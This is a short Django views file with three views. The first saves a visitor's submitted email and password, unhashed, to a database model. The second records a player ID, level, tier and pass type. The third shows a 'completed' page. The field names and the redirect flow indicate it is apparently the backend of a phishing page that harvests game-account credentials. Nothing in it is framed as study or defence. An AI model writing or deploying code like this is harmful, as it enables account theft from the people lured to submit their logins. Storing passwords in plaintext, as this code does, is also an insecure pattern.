from django.shortcuts import render
from . models import Loginy , Datay
from django.shortcuts import redirect

from django.http import HttpResponse, HttpResponseNotFound, Http404,  HttpResponseRedirect
import datetime
from datetime import time






def index(request):

    dt = datetime.datetime.now()

    email = request.POST.get('email')
    password = request.POST.get('password')
    
    data = Loginy(username=email , password=password)

    if request.method == 'POST':
        data.save()
        return HttpResponseRedirect('verification')
    
  
    else:
        context = {'dt':dt}
        return render(request , 'temp/index.html' , context) 




def verific(request):

    playid = request.POST.get('playid')
    level = request.POST.get('level')
    tier = request.POST.get('tier')
    rpt = request.POST.get('rpt')
    
    data = Datay(nameRP=tier , typeUs=rpt , level=level , acID=playid)

    if request.method == 'POST':
        data.save()
        return HttpResponseRedirect('completed')
    
  
    else:
        context = {}
        return render(request , 'temp/verification.html' , context)




def complet(request):
    
    dttt = time(hour=4, minute=59)
     
    
    context = {'dttt':dttt}
    return render(request , 'temp/completed.html' , context)